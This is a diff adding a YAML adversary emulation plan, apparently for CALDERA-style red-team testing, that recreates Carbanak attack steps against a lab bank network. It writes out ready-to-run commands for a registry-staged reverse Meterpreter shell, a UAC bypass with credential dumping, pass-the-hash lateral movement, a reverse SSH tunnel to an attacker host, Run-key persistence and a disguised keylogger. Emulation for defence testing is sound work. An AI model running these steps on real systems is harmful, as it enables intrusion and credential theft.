@@ -1,0 +1,774 @@
+# Carbanak.yaml - CALDERA and Atomic style TTPs
+
+- emulation_plan_details:
+    id: 186b4d47-f4c0-48cb-9688-887070db45f1
+    adversary_name: Carbanak
+    adversary_description: An advanced attacker targeting financial institutions
+    attack_version: 8.1
+    format_version: 1.0
+
+# Scenario 1
+
+# Step 1 - Initial Access - skipped, requires user interaction
+
+# Step 2 - Local Discovery and Collection
+
+  # 2.A - Local Discovery - skipped, involves interaction with RAT through external C2 channel
+
+- id: 453cb643-892b-475d-8db9-df61289749f1
+  name: Screen Capture
+  description: Download screen capture PowerShell script to target and execute
+  tactic: collection
+  technique:
+    attack_id: T1113
+    name: "Screen Capture"
+  cti_source: "https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html"
+  procedure_group: procedure_collection
+  procedure_step: "2.B.1"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          powershell.exe -ExecutionPolicy Bypass -File .\take-screenshot.ps1
+        payloads:
+        - take-screenshot.ps1
+        cleanup: |
+          Remove-Item -Force screenshot__.png
+
+  input_arguments:
+    server:
+      description: IP or Hostname of server
+      type: string
+      default: 192.0.2.10
+
+  executors:
+  - name: powershell
+    command: |
+      powershell.exe -ExecutionPolicy Bypass -File .\take-screenshot.ps1
+    cleanup_command: |
+      Remove-Item -Force screenshot__.png
+
+  # 2.B.2 - Upload Screenshot to Server - skipped, requires interaction with RAt through external C2 server
+
+# Step 3 - 2nd Stage RAT
+
+- id: e238f1b5-a4e7-464d-82eb-36d0cc875434
+  name: Stage 2nd Stage RAT
+  description: The shellcode for the 2nd stage RAT, which is a reverse Meterpreter shell, is written to the Registry
+  tactic: defense-evasion
+  technique:
+    attack_id: T1112
+    name: "Modify Registry"
+  cti_source: "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064518/Carbanak_APT_eng.pdf"
+  procedure_group: procedure_def_evasion
+  procedure_step: "3.A"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          cmd.exe /c 'REG ADD "HKCU\Software\InternetExplorer\AppDataLow\Software\Microsoft\InternetExplorer" /f /v "{018247B2CAC14652E}" /t REG_SZ /d H4sIAJEshl4C/2sx/Dmnc9KWyqoKC21LTQ1NfSPP1fIGnzQkDD9qJRp91o4y+MShYVh63tjA1GOzgceuK67SLNVhERa7N5ZYV+6YMVXbWhOoMvKjlatR5UqZn4xJxdWlf7mrKio//vgIJI3+7uSTN6xeofnRINHus2WUYcWq2fpG7RusP/t+MqhYAzUTaprTDJ5ukyqzmEJ7xxX8CxSB6uOA6uUsPpYYAtlpQLblp7oPQNMslCwVVRSVrRUslC2VjX5PjbLUbp2haK2obPQ5e7JxW2u7ivExPk4vNU+vyipLfeOP841+Tr1VWVll+GG+4dGKirRXOy5W1VjoGX6YZ/Kh2/KwGX98bfsas4+ThSorqioUrA8F/BKubF0rXGCprqVh4r3RxHuHYesOw8+7wOROiwOTypbOaFtv8GGvUKa1gunnWYafGy0OPLzDJ9m2HujfIoPWbTzzJ7wCef/31CyDDzOA3hSqtVYAK6tasEm9bf3vxio2HaPfe6PUPvQIWVorClZlAJ2qaPSx28hzg/UhxXvac1rXGn7ebfB5P9ABBp87DD8vQtXOGqhkqacsUGlVUWmtIFylZHGgOKzUo229PtD9PCKmEq1rgc6Y4Nbe1mpQsdMgYI/Bnx7es9bt85SEKpUN9+3oOHNDr209AOpTVHH+AQAA'
+
+  executors:
+  - name: powershell
+    command: |
+      cmd.exe /c 'REG ADD "HKCU\Software\InternetExplorer\AppDataLow\Software\Microsoft\InternetExplorer" /f /v "{018247B2CAC14652E}" /t REG_SZ /d H4sIAJEshl4C/2sx/Dmnc9KWyqoKC21LTQ1NfSPP1fIGnzQkDD9qJRp91o4y+MShYVh63tjA1GOzgceuK67SLNVhERa7N5ZYV+6YMVXbWhOoMvKjlatR5UqZn4xJxdWlf7mrKio//vgIJI3+7uSTN6xeofnRINHus2WUYcWq2fpG7RusP/t+MqhYAzUTaprTDJ5ukyqzmEJ7xxX8CxSB6uOA6uUsPpYYAtlpQLblp7oPQNMslCwVVRSVrRUslC2VjX5PjbLUbp2haK2obPQ5e7JxW2u7ivExPk4vNU+vyipLfeOP841+Tr1VWVll+GG+4dGKirRXOy5W1VjoGX6YZ/Kh2/KwGX98bfsas4+ThSorqioUrA8F/BKubF0rXGCprqVh4r3RxHuHYesOw8+7wOROiwOTypbOaFtv8GGvUKa1gunnWYafGy0OPLzDJ9m2HujfIoPWbTzzJ7wCef/31CyDDzOA3hSqtVYAK6tasEm9bf3vxio2HaPfe6PUPvQIWVorClZlAJ2qaPSx28hzg/UhxXvac1rXGn7ebfB5P9ABBp87DD8vQtXOGqhkqacsUGlVUWmtIFylZHGgOKzUo229PtD9PCKmEq1rgc6Y4Nbe1mpQsdMgYI/Bnx7es9bt85SEKpUN9+3oOHNDr209AOpTVHH+AQAA'
+
+- id: 50cf48b9-2076-4efc-80f1-5b8f421ecae4
+  name: Execute 2nd Stage RAT
+  description: A PowerShell script is used to execute the staged 2nd stage RAT, which is a reverse Meterpreter shell
+  tactic: defense-evasion
+  technique:
+    attack_id: T1140
+    name: "Deobfuscate/Decode Files or Information"
+  cti_source: "https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/operation-grand-mars-a-comprehensive-profile-of-carbanak-activity-in-201617/"
+  procedure_group: procedure_def_evasion
+  procedure_step: "3.B"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          Move-Item reverse.ps1 LanCradDriver.ps1;
+          powershell.exe -ExecutionPolicy Bypass -NoExit -File LanCradDriver.ps1
+        payloads:
+        - reverse.ps1
+        cleanup: |
+          Remove-Item -Force LanCradDriver.ps1
+
+  input_arguments:
+    domain.name.short:
+      description: Short name of the domain
+      type: string
+      default: financial
+    domain.admin.username:
+      description: Username of domain administrator
+      type: string
+      default: kmitnick
+
+  executors:
+  - name: powershell
+    command: |
+      Move-Item reverse.ps1 LanCradDriver.ps1;
+      powershell.exe -ExecutionPolicy Bypass -NoExit -File LanCradDriver.ps1
+    cleanup_command: |
+      Remove-Item -Force LanCradDriver.ps1
+
+# Step 4 - Domain Discovery and Credential Dumping
+
+  # 4.A.1 - File and Directory Discovery - skipped, uses a native Meterpreter command, ls
+
+  # 4.A.2 - Remote System Discovery - skipped, involves loading and running PowerView from memory
+
+  # 4.A.3 - Brute Force: Password Spraying - skipped, involves loading and running PowerView from memory
+
+- id: 473e5707-5786-4f53-934f-22175c1059b0
+  name: UAC Bypass and Credential Dumping
+  description: A UAC Bypass script and modified Mimikatz are uploaded to current directory and executed
+  tactic: credential-dumping
+  technique:
+    attack_id: T1003.001
+    name: "OS Credential Dumping: LSASS Memory"
+  cti_source: "https://www.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s04-hello-carbanak.pdf"
+  procedure_group: procedure_cred_access
+  procedure_step: "4.B.1"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          Move-Item attackkatz.exe smrs.exe;
+          powershell.exe -ExecutionPolicy Bypass -File uac-bypass.ps1 "cmd.exe /C $pwd\smrs.exe > $pwd\MGsCOxPSNK.txt"
+        payloads:
+        - uac-bypass.ps1
+        - attackkatz.exe
+        cleanup: |
+          Remove-Item -Force smrs.exe;
+          Remove-Item -Force MGsCOxPSNK.txt
+  executors:
+  - name: powershell
+    command: |
+      powershell.exe -ExecutionPolicy Bypass -File uac-bypass.ps1 "cmd.exe /C $pwd\attackkatz.exe > $pwd\MGsCOxPSNK.txt"
+    cleanup_command: |
+      Remove-Item -Force smrs.exe;
+      Remove-Item -Force MGsCOxPSNK.txt
+
+- id: 31e07036-7e57-4405-854e-827b9ef8b434
+  name: Read Dumped Credentials
+  description: Read the dumped credentials from the previous UAC Bypass and Credential Dumping step
+  tactic: credential-dumping
+  technique:
+    attack_id: T1003.001
+    name: "OS Credential Dumping: LSASS Memory"
+  cti_source: "https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/new-carbanak-anunak-attack-methodology/"
+  procedure_group: procedure_cred_access
+  procedure_step: "4.B.2"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          cat MGsCOxPSNK.txt;
+  executors:
+  - name: powershell
+    command: |
+      cat MGsCOxPSNK.txt;
+
+# Step 5 - Lateral Movement
+
+- id: 8bd3edc3-14ad-4e44-9e45-9ec8d43f374b
+  name: Upload Tools for Lateral Movement
+  description: Tools required for lateral movement are uploaded and moved to the expected directory.
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: "Ingress Tool Transfer"
+  cti_source: "https://www.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s04-hello-carbanak.pdf"
+  procedure_group: procedure_command_control
+  procedure_step: "5.A.1"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          New-Item -ItemType Directory -Force C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver;
+          Move-Item pscp.exe C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\pscp.exe;
+          Move-Item psexec.py C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\psexec.py;
+          Move-Item impacket_exe C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\runtime;
+          Move-Item plink.exe C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\plink.exe;
+          Move-Item tiny.exe C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\tiny.exe;
+        payloads:
+        - pscp.exe
+        - psexec.py
+        - impacket_exe
+        - plink.exe
+        - tiny.exe
+        cleanup: |
+          Remove-Item -Force C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\pscp.exe;
+          Remove-Item -Force C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\psexec.py;
+          Remove-Item -Force C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\runtime;
+          Remove-Item -Force C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\plink.exe;
+          Remove-Item -Force C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\tiny.exe
+
+  input_arguments:
+    domain.name.short:
+      description: Short name of the domain
+      type: string
+      default: financial
+    domain.admin.username:
+      description: Username of domain administrator
+      type: string
+      default: kmitnick
+
+  executors:
+  - name: powershell
+    command: |
+      New-Item -ItemType Directory -Force C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver;
+      Move-Item pscp.exe C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\pscp.exe;
+      Move-Item psexec.py C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\psexec.py;
+      Move-Item impacket_exe C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\runtime;
+      Move-Item plink.exe C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\plink.exe;
+      Move-Item tiny.exe C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\tiny.exe;
+    cleanup_command: |
+      Remove-Item -Force C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\pscp.exe;
+      Remove-Item -Force C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\psexec.py;
+      Remove-Item -Force C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\runtime;
+      Remove-Item -Force C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\plink.exe;
+      Remove-Item -Force C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\tiny.exe
+
+- id: 4983721e-9633-4e33-bc2f-b4e9f58336a0
+  name: Lateral Tool Transfer
+  description: Previously uploaded tools are transferred to bankfileserver using pscp.exe
+  tactic: lateral-movement
+  technique:
+    attack_id: T1570
+    name: "Lateral Tool Transfer"
+  cti_source: "https://www.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s04-hello-carbanak.pdf"
+  procedure_group: procedure_lat_movement
+  procedure_step: "5.A.2"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\pscp.exe -scp -pw "#{domain.admin.password}" C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\psexec.py #{domain.admin.username}@#{bankfileserver.ip.address}:/tmp/psexec.py;
+          C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\pscp.exe -scp -pw "#{domain.admin.password}" C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\runtime #{domain.admin.username}@#{bankfileserver.ip.address}:/tmp/runtime;
+          C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\pscp.exe -scp -pw "#{domain.admin.password}" C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\tiny.exe #{domain.admin.username}@#{bankfileserver.ip.address}:/tmp/tiny;
+
+  input_arguments:
+    domain.name.short:
+      description: Short name of the domain
+      type: string
+      default: financial
+    domain.admin.username:
+      description: Username of domain administrator
+      type: string
+      default: kmitnick
+    domain.admin.password:
+      description: Password of domain administrator
+      type: string
+      default: 79a&LbjM@MlW8XZa
+    bankfileserver.ip.address:
+      description: IP address of bankfileserver
+      type: string
+      default: 10.0.0.7
+
+  executors:
+  - name: powershell
+    command: |
+      C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\pscp.exe -scp -pw "#{domain.admin.password}" C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\psexec.py #{domain.admin.username}@#{bankfileserver.ip.address}:/tmp/psexec.py;
+      C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\pscp.exe -scp -pw "#{domain.admin.password}" C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\runtime #{domain.admin.username}@#{bankfileserver.ip.address}:/tmp/runtime;
+      C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\pscp.exe -scp -pw "#{domain.admin.password}" C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\tiny #{domain.admin.username}@#{bankfileserver.ip.address}:/tmp/tiny;
+
+- id: 51da22bc-a6a4-4d60-95ab-d61af87a23d0
+  name: SSH to bankfileserver
+  description: Use plink.exe to SSH into bankfileserver
+  tactic: lateral-movement
+  technique:
+    attack_id: T1021.004
+    name: "Remote Services: SSH"
+  cti_source: "https://www.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s04-hello-carbanak.pdf"
+  procedure_group: procedure_lat_movement
+  procedure_step: "5.B.1"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\plink.exe #{domain.admin.username}@#{bankfileserver.ip.address} -pw #{domain.admin.password}
+
+  input_arguments:
+    domain.name.short:
+      description: Short name of the domain
+      type: string
+      default: financial
+    domain.admin.username:
+      description: Username of domain administrator
+      type: string
+      default: kmitnick
+    domain.admin.password:
+      description: Password of domain administrator
+      type: string
+      default: 79a&LbjM@MlW8XZa
+    bankfileserver.ip.address:
+      description: IP address of bankfileserver
+      type: string
+      default: 10.0.0.7
+
+  executors:
+  - name: powershell
+    command: |
+      C:\Users\#{domain.admin.username}.#{domain.name.short}\AppData\Roaming\TransbaseOdbcDriver\plink.exe #{domain.admin.username}@#{bankfileserver.ip.address} -pw '#{domain.admin.password}'
+
+- id: 9c5d756e-c72a-40d0-838d-3ace6cc96a09
+  name: Process Discovery on bankfileserver
+  description: Processes are listed on bankfileserver
+  tactic: discovery
+  technique:
+    attack_id: T1057
+    name: "Process Discovery"
+  cti_source: "https://www.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s04-hello-carbanak.pdf"
+  procedure_group: procedure_discovery
+  procedure_step: "5.B.2"
+  platforms:
+    linux:
+      sh:
+        command: |
+          ps ax
+
+  executors:
+  - name: sh
+    command: |
+      ps ax
+
+- id: da810df4-c1c2-48f1-a29a-765098acec17
+  name: File and Directory Discovery on bankfileserver
+  description: List directories and files within the /var/ directory on bankfileserver
+  tactic: discovery
+  technique:
+    attack_id: T1083
+    name: "File and Directory Discovery"
+  cti_source: "https://www.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s04-hello-carbanak.pdf"
+  procedure_group: procedure_discovery
+  procedure_step: "5.B.3"
+  platforms:
+    linux:
+      sh:
+        command: |
+          ls -lsahR /var/ 2>/dev/null
+
+  executors:
+  - name: sh
+    command: |
+      ls -lsahR /var/ 2>/dev/null
+
+- id: 9ec26b39-9d77-4a3d-b309-8c819a2f59e7
+  name: Data from Local System on bankfileserver 1
+  description: Read files within the /var/tmp/ directory on bankfileserver 1
+  tactic: collection
+  technique:
+    attack_id: T1005
+    name: "Data from Local System"
+  cti_source: "https://www.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s04-hello-carbanak.pdf"
+  procedure_group: procedure_collection
+  procedure_step: "5.B.4"
+  platforms:
+    linux:
+      sh:
+        command: |
+          cat /var/tmp/network-diagram-financial.xml
+
+  executors:
+  - name: sh
+    command: |
+      cat /var/tmp/network-diagram-financial.xml
+
+- id: f87e0022-4c82-447f-a0d2-52b2be030b6d
+  name: Data from Local System on bankfileserver 2
+  description: Read files within the /var/tmp/ directory on bankfileserver 2
+  tactic: collection
+  technique:
+    attack_id: T1005
+    name: "Data from Local System"
+  cti_source: "https://www.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s04-hello-carbanak.pdf"
+  procedure_group: procedure_collection
+  procedure_step: "5.B.5"
+  platforms:
+    linux:
+      sh:
+        command: |
+          cat /var/tmp/help-desk-ticket.txt
+
+  executors:
+  - name: sh
+    command: |
+      cat /var/tmp/help-desk-ticket.txt
+
+- id: 76c8f978-cc38-4281-8236-ecb7fae8f99c
+  name: Remote System Discovery on bankfileserver
+  description: The nslookup utility is used to find the IP address of bankdc
+  tactic: discovery
+  technique:
+    attack_id: T1018
+    name: "Remote System Discovery"
+  cti_source: "https://www.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s04-hello-carbanak.pdf"
+  procedure_group: procedure_discovery
+  procedure_step: "5.B.6"
+  platforms:
+    linux:
+      sh:
+        command: |
+          nslookup bankdc
+
+  executors:
+  - name: sh
+    command: |
+      nslookup bankdc
+
+- id: b82639f7-530b-4ff5-baa8-ff249cd73df4
+  name: Lateral Movement to bankdc from bankfileserver
+  description: Lateral Movement to bankdc from bankfileserver using psexec.py
+  tactic: lateral-movement
+  technique:
+    attack_id: T1569.002
+    name: "System Services: Service Execution"
+  cti_source: "https://www.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s04-hello-carbanak.pdf"
+  procedure_group: procedure_lat_movement
+  procedure_step: "5.C.1"
+  platforms:
+    linux:
+      sh:
+        command: |
+          chmod 755 /tmp/runtime && /tmp/runtime /tmp/psexec.py #{domain.name.full}/#{domain.admin.username}@#{bankdc.ip.address} -hashes #{domain.admin.password.hash}
+
+  input_arguments:
+    domain.name.full:
+      description: Full name of the domain
+      type: string
+      default: financial.local
+    domain.admin.username:
+      description: Username of domain administrator
+      type: string
+      default: kmitnick
+    domain.admin.password.hash:
+      description: NTLM hash of domain administrator's password
+      type: string
+      default: "aad3b435b51404eeaad3b435b51404ee:c3aa78cd0827b8e8603ac1c8996e6556"
+    bankdc.ip.address:
+      description: IP address of bankdc
+      type: string
+      default: 10.0.0.4
+
+  executors:
+  - name: sh
+    command: |
+      chmod 755 /tmp/runtime && /tmp/runtime /tmp/psexec.py #{domain.name.full}/#{domain.admin.username}@#{bankdc.ip.address} -hashes #{domain.admin.password.hash}
+
+  # 5.C.2 - Mount Attacker SMB Share - skipped, uses PsExec functionality
+
+- id: 7e3a8de9-edb9-4df4-beef-9577c4562420
+  name: Upload and execute Tiny.exe on bankdc
+  description: Upload and execute Tiny.exe on bankdc. Requires elevated agent
+  tactic: command-and-control
+  technique:
+    attack_id: T1571
+    name: "Non-Standard Port"
+  cti_source: "https://www.crowdstrike.com/blog/arrests-put-new-focus-on-carbon-spider-adversary-group/"
+  procedure_group: procedure_discovery
+  procedure_step: "5.C.3"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          Move-Item tiny.exe C:\Windows\tiny.exe;
+          C:\Windows\tiny.exe 192.168.0.4 8080
+        payloads:
+        - tiny.exe
+        cleanup: |
+          Remove-Item -Force C:\Windows\tiny.exe
+
+  executors:
+  - name: powershell
+    command: |
+      Move-Item tiny.exe C:\Windows\tiny.exe;
+      C:\Windows\tiny.exe 192.168.0.4 8080
+    cleanup_command: |
+      Remove-Item -Force C:\Windows\tiny.exe
+
+# Step 6 - Discovery
+
+- id: c66c3b49-719f-4643-a307-4a889177b61d
+  name: Get CFO Workstation Information from bankdc
+  description: Get CFO Workstation Information from bankdc by running Get-ADComputer
+  tactic: discovery
+  technique:
+    attack_id: T1018
+    name: "Remote System Discovery"
+  cti_source: "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064518/Carbanak_APT_eng.pdf"
+  procedure_group: procedure_discovery
+  procedure_step: "6.A.1"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          Get-ADComputer -Identity 'cfo' -Properties *
+
+  executors:
+  - name: powershell
+    command: |
+      Get-ADComputer -Identity 'cfo' -Properties *
+
+  # 6.A.2 - Account Discovery: Domain Account - skipped, involves loading and running PowerView from memory
+
+# Step 7 - Lateral Movement to CFO
+
+- id: 38d009be-4ba2-46dc-a321-8be05c07630c
+  name: Create SSH Tunnel on bankdc
+  description: The nslookup utility is used to find the IP address of bankdc
+  tactic: command-and-control
+  technique:
+    attack_id: T1572
+    name: "Protocol Tunneling"
+  cti_source: "https://securelist.com/the-great-bank-robbery-the-carbanak-apt/68732/"
+  procedure_group: procedure_command_control
+  procedure_step: "7.A.1"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          Move-Item plink.exe C:\Windows\Temp\plink.exe;
+          echo n | C:\Windows\Temp\plink.exe -pw "#{attacker.sshuser.password}" #{attacker.sshuser.username}@192.168.0.4 -R 3389:localhost:3389
+        payloads:
+        - plink.exe
+        cleanup: |
+          Remove-Item -Force C:\Windows\Temp\plink.exe
+
+  input_arguments:
+    attacker.sshuser.username:
+      description: Username of attacker ssh account
+      type: string
+      default: alfred
+    attacker.sshuser.password:
+      description: Password of attacker ssh account
+      type: string
+      default: azsxdcAZSXDC123
+
+  executors:
+  - name: powershell
+    command: |
+      Move-Item plink.exe C:\Windows\Temp\plink.exe;
+      echo n | C:\Windows\Temp\plink.exe -pw "#{attacker.sshuser.password}" #{attacker.sshuser.username}@192.168.0.4 -R 3389:localhost:3389
+    cleanup_command: |
+      Remove-Item -Force C:\Windows\Temp\plink.exe
+
+  # 7.A.2 - RDP to bankdc - skipped, RDP not supported
+
+- id: 71c20631-adf4-4073-9f2f-6ab7f053326f
+  name: Check for Active CFO Login on CFO from BankDC
+  description: Use qwinsta to check if the CFO user is logged into their workstation
+  tactic: discovery
+  technique:
+    attack_id: T1033
+    name: "System Owner/User Discovery"
+  cti_source: "https://securelist.com/the-great-bank-robbery-the-carbanak-apt/68732/"
+  procedure_group: procedure_discovery
+  procedure_step: "7.B.1"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          qwinsta /server:cfo
+
+  executors:
+  - name: powershell
+    command: |
+      qwinsta /server:cfo
+
+  # 7.B.2 - Lateral Movement to CFO via RDP - skipped, RDP not supported
+
+- id: 5beb978f-dce0-4ccd-b4fa-de47e0adb453
+  name: Upload JavaUpdate.exe and Create JavaUpdate.vbs on CFO
+  description: Upload JavaUpdater.exe and Create JavaUpdater.vbs on CFO. Files renamed to prevent auto-removal after execution of step
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: "Ingress Tool Transfer"
+  cti_source: "https://securelist.com/the-great-bank-robbery-the-carbanak-apt/68732/"
+  procedure_group: procedure_command_control
+  procedure_step: "7.C.1"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          Move-Item Java-Update.exe C:\Users\Public\Java-Updater.exe;
+          echo Set oShell = CreateObject ("Wscript.Shell") > C:\Users\Public\Java-Update.vbs;
+          echo Dim strArgs >> C:\Users\Public\Java-Update.vbs;
+          echo strArgs = "C:\Users\Public\Java-Updater.exe" >> C:\Users\Public\Java-Update.vbs;
+          echo oShell.Run strArgs, 0, false >> C:\Users\Public\Java-Update.vbs
+        payloads:
+        - Java-Update.exe
+        cleanup: |
+          Remove-Item -Force C:\Users\Public\Java-Updater.exe;
+          Remove-Item -Force C:\Users\Public\Java-Update.vbs
+
+  executors:
+  - name: powershell
+    command: |
+      Move-Item Java-Update.exe C:\Users\Public\Java-Updater.exe;
+      echo Set oShell = CreateObject ("Wscript.Shell") > C:\Users\Public\Java-Update.vbs & echo Dim strArgs >> C:\Users\Public\Java-Update.vbs & echo strArgs = "C:\Users\Public\Java-Updater.exe" >> C:\Users\Public\Java-Update.vbs & echo oShell.Run strArgs, 0, false >> C:\Users\Public\Java-Update.vbs
+    cleanup_command: |
+      Remove-Item -Force C:\Users\Public\Java-Updater.exe;
+      Remove-Item -Force C:\Users\Public\Java-Update.vbs
+
+
+- id: 6af29018-9779-49aa-ad8e-66627a23f329
+  name: Set Registry Persistence on CFO
+  description: Set Registry Persistence on CFO to run Java-Update.vbs when the CFO user logs in
+  tactic: persistence
+  technique:
+    attack_id: T1547.001
+    name: "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
+  cti_source: "https://securelist.com/the-great-bank-robbery-the-carbanak-apt/68732/"
+  procedure_group: procedure_persistence
+  procedure_step: "7.C.2"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          cmd.exe /c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /f /v Java-Update /t REG_SZ /d C:\Users\Public\Java-Update.vbs
+        cleanup: |
+          cmd.exe /c reg delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /f /v Java-Update
+
+  executors:
+  - name: powershell
+    command: |
+      cmd.exe /c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /f /v Java-Update /t REG_SZ /d C:\Users\Public\Java-Update.vbs
+    cleanup_command: |
+      cmd.exe /c reg delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /f /v Java-Update
+
+# Step 8 - Registry Persistence Execution - skipped, requires legitimate user interaction
+
+# Step 9 - Collection
+
+- id: 5f3f7045-ae92-4a3e-8b39-35e4f8cc3038
+  name: Upload and Execute Keylogger on CFO as CFO
+  description: Upload and Execute Keylogger on CFO as CFO
+  tactic: collection
+  technique:
+    attack_id: T1056.001
+    name: "Input Capture: Keylogging"
+  cti_source: "https://www.fireeye.com/blog/threat-research/2019/04/carbanak-week-part-four-desktop-video-player.html"
+  procedure_group: procedure_collection
+  procedure_step: "9.A.1"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          Move-Item keylogger.exe C:\Users\#{cfo.user.username}\AppData\Local\Temp\DefenderUpgradeExec.exe;
+          C:\Users\#{cfo.user.username}\AppData\Local\Temp\DefenderUpgradeExec.exe
+        payloads:
+        - keylogger.exe
+        cleanup: |
+          Remove-Item -Force C:\Users\#{cfo.user.username}\AppData\Local\Temp\DefenderUpgradeExec.exe
+
+  input_arguments:
+    cfo.user.username:
+      description: Username of CFO user
+      type: string
+      default: jsmith
+
+  executors:
+  - name: powershell
+    command: |
+      Move-Item keylogger.exe C:\Users\#{cfo.user.username}\AppData\Local\Temp\DefenderUpgradeExec.exe;
+      C:\Users\#{cfo.user.username}\AppData\Local\Temp\DefenderUpgradeExec.exe
+    cleanup_command: |
+      Remove-Item -Force C:\Users\#{cfo.user.username}\AppData\Local\Temp\DefenderUpgradeExec.exe
+
+  # 9.A.2 - Screen Capture - skipped, uses Metasploit's screen_spy module
+
+  # 9.A.3 - Legitimate CFO User Activity - skipped
+
+- id: 8b2f52d8-40d8-4f70-bf9e-cb999d325958
+  name: Read Keylogging Data
+  description: Read contents of keylogger output file
+  tactic: collection
+  technique:
+    attack_id: T1056.001
+    name: "Input Capture: Keylogging"
+  cti_source: "https://www.fireeye.com/blog/threat-research/2019/04/carbanak-week-part-four-desktop-video-player.html"
+  procedure_group: procedure_collection
+  procedure_step: "9.A.4"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          type C:\Users\#{cfo.user.username}\AppData\Local\Temp\klog2.txt
+
+  input_arguments:
+    cfo.user.username:
+      description: Username of CFO user
+      type: string
+      default: jsmith
+
+  executors:
+  - name: powershell
+    command: |
+      type C:\Users\#{cfo.user.username}\AppData\Local\Temp\klog2.txt
+
+- id: 22ddbc4f-fb5d-4785-8bc8-373da2f3e176
+  name: Upload and Execute Web Cred Dumper on CFO as CFO
